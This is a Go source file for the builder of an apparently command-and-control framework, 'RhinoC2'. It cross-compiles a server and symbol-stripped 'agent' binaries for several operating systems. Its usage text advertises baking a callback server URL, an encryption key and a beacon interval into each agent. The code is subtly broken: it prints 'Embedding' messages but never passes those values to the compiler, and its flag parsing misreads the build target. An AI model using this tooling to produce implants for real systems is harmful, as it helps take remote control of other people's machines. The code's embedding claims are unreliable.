package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	args := os.Args[1:]

	if len(args) == 0 {
		printUsage()
		return
	}

	command := args[0]

	switch command {
	case "build":
		buildCommand(args[1:])
	case "generate":
		generateCommand(args[1:])
	case "help":
		printUsage()
	default:
		fmt.Printf("Unknown command: %s\n", command)
		printUsage()
	}
}

func buildCommand(args []string) {
	var server, key, interval string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--server":
			if i+1 < len(args) {
				server = args[i+1]
				i++
			}
		case "--key":
			if i+1 < len(args) {
				key = args[i+1]
				i++
			}
		case "--interval":
			if i+1 < len(args) {
				interval = args[i+1]
				i++
			}
		}
	}

	if len(args) == 0 {
		fmt.Println("Building all components with default config...")
		buildServer("", "", "")
		buildAgent("windows", "amd64", server, key, interval)
		return
	}

	target := args[0]
	switch target {
	case "server":
		buildServer("", "", "")
	case "agent":
		goos := "windows"
		goarch := "amd64"
		if len(args) >= 3 {
			goos = args[1]
			goarch = args[2]
		}
		buildAgent(goos, goarch, server, key, interval)
	case "all":
		buildServer("", "", "")
		buildAgent("windows", "amd64", server, key, interval)
		buildAgent("linux", "amd64", server, key, interval)
	default:
		fmt.Printf("Unknown build target: %s\n", target)
	}
}

func buildServer(port, host, key string) {
	fmt.Println("Building server...")

	ldflags := "-s -w"
	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", "server.exe", "server.go")
	cmd.Dir = "server"
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("Build failed: %v\n", err)
		return
	}

	fmt.Println("✓ Server built: server/server.exe")
}

func buildAgent(goos, goarch, server, key, interval string) {
	validOS := map[string]bool{"windows": true, "linux": true, "darwin": true, "freebsd": true}
	validArch := map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true}
	
	if !validOS[goos] {
		fmt.Printf("Invalid OS: %s (allowed: windows, linux, darwin, freebsd)\n", goos)
		return
	}
	if !validArch[goarch] {
		fmt.Printf("Invalid arch: %s (allowed: amd64, 386, arm, arm64)\n", goarch)
		return
	}
	
	fmt.Printf("Building agent for %s/%s...\n", goos, goarch)

	ldflags := "-s -w"
	if server != "" {
		fmt.Printf("  Embedding server: %s\n", server)
	}
	if key != "" {
		fmt.Printf("  Embedding key: %s\n", key)
	}
	if interval != "" {
		fmt.Printf("  Embedding interval: %s\n", interval)
	}

	ext := ""
	if goos == "windows" {
		ext = ".exe"
	}

	outputPath := filepath.Join("releases", fmt.Sprintf("agent_%s_%s%s", goos, goarch, ext))

	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "agent.go")
	cmd.Dir = "agent"
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	os.MkdirAll("agent/releases", 0755)

	if err := cmd.Run(); err != nil {
		fmt.Printf("Build failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Agent built: agent/%s\n", outputPath)
}

func generateCommand(args []string) {
	if len(args) == 0 {
		fmt.Println("Usage: builder generate [config|payload]")
		return
	}

	switch args[0] {
	case "config":
		generateConfig()
	case "payload":
		generatePayload()
	default:
		fmt.Printf("Unknown generate target: %s\n", args[0])
	}
}

func generateConfig() {
	fmt.Println("Use 'go run cmd/config/main.go' for interactive config generation")
	fmt.Println("Or create manually:")
	fmt.Println("\nAgent config (agent_config.json):")
	fmt.Println(`{
  "server": "ws://192.168.1.100:8443/api/agent",
  "key": "YourSecretKey",
  "interval": 5
}`)
	fmt.Println("\nServer config (server_config.json):")
	fmt.Println(`{
  "port": "8443",
  "host": "0.0.0.0",
  "key": "YourSecretKey"
}`)
}

func generatePayload() {
	fmt.Println("Payload generation integrated with server web panel")
	fmt.Println("Access at: http://localhost:8443/panel.html -> Build section")
}

func printUsage() {
	usage := `RhinoC2 Framework Builder v1.2.0

Usage:
  builder [command] [options]

Commands:
  build [target] [os] [arch] [--server URL] [--key KEY] [--interval SEC]
    Build components with optional embedded configuration
    
    targets: server, agent, all
    os: windows, linux, darwin
    arch: amd64, 386, arm64
    
    Options:
      --server   Agent server URL (embedded in binary)
      --key      Encryption key (embedded in binary)
      --interval Callback interval in seconds (embedded in binary)
    
  generate [type]
    Generate configuration templates
    types: config, payload
    
  help
    Show this help

Examples:
  # Build with default config (runtime configurable)
  builder build all
  
  # Build agent with embedded config
  builder build agent windows amd64 --server ws://192.168.1.100:8443/api/agent --key SecretKey --interval 10
  
  # Build just server
  builder build server
  
  # Build multi-platform agents
  builder build agent linux amd64
  builder build agent darwin arm64

Note: Configuration priority: 1) CLI flags, 2) Environment vars, 3) Config file, 4) Embedded defaults
`
	fmt.Println(usage)
}
